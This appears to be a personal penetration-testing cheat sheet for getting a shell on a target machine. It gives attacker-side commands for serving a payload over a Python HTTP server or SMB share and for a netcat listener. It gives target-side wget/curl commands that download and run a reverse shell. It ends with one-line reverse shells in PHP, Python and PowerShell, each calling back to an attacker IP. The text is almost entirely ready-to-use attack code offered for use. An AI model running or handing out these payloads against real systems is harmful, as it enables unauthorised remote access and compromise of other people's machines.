# Getting the shell on the target
## Python SimpleHTTPServer

On my machine:
```console
# Setup HTTP server to move reverse shell
python -m SimpleHTTPServer 8000

# Setup netcat to listen to incoming traffic on specified port
nc -v -n -l -p 1234
```

On the target:
```console
wget http://192.168.1.1/myrevshell
or
curl -O http://192.168.1.1/myrevshell
chmod +x myrevshell
./myrevshell
```

## Smbserver
Put the reverse shell in the folder ~/
On my machine:
```console smbserver oerlex ~/192.168.1.77```

On the target:
```console copy \\192.168.1.77\oerlex\shell.bat```

# Reverse Shells
## PHP
Tiny PHP reverse shell taken from --> https://gist.github.com/rshipp/eee36684db07d234c1cc
```PHP
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/1234 0>&1'");
```

## Python
Taken from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

## Powershell
Thanks to https://coffeejunkie.me/jeeves-HTB/ / @CoffeeJunkiee
`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.1',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
